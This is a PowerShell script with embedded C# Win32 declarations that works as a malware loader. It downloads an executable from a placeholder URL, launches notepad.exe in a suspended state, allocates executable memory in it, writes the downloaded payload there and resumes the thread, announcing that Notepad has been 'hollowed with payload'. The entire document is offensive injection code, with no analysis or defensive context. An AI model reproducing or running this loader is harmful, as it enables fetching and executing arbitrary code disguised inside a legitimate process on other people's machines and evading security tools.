Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
}
"@ -PassThru

# Replace this with your direct link to the payload .exe
$payloadUrl = "https://example.com/payload.exe"
$tempPath = "$env:TEMP\payload.exe"

try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $tempPath -UseBasicParsing
} catch {
    Write-Host "[!] Failed to download payload."
    exit
}

# Read the payload
$payloadBytes = [System.IO.File]::ReadAllBytes($tempPath)

# Setup STARTUPINFO and PROCESS_INFORMATION
$si = New-Object Win32+STARTUPINFO
$pi = New-Object Win32+PROCESS_INFORMATION
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)

# Start notepad in suspended mode
$success = [Win32]::CreateProcess(
    "C:\Windows\System32\notepad.exe",
    $null,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    $false,
    0x4, # CREATE_SUSPENDED
    [IntPtr]::Zero,
    $null,
    [ref]$si,
    [ref]$pi
)

if (-not $success) {
    Write-Host "[!] Failed to create suspended process."
    exit
}

# Allocate memory in target process
$remoteAddr = [Win32]::VirtualAllocEx(
    $pi.hProcess,
    [IntPtr]::Zero,
    [uint32]$payloadBytes.Length,
    0x3000, # MEM_COMMIT | MEM_RESERVE
    0x40    # PAGE_EXECUTE_READWRITE
)

if ($remoteAddr -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to allocate memory."
    exit
}

# Write payload to remote memory
$bytesWritten = [UIntPtr]::Zero
$write = [Win32]::WriteProcessMemory(
    $pi.hProcess,
    $remoteAddr,
    $payloadBytes,
    [uint32]$payloadBytes.Length,
    [ref]$bytesWritten
)

if (-not $write) {
    Write-Host "[!] Failed to write memory."
    exit
}

# Resume target process (payload will run if entry point is correct)
[Win32]::ResumeThread($pi.hThread) | Out-Null

Write-Host "[+] Injection complete. Notepad hollowed with payload."
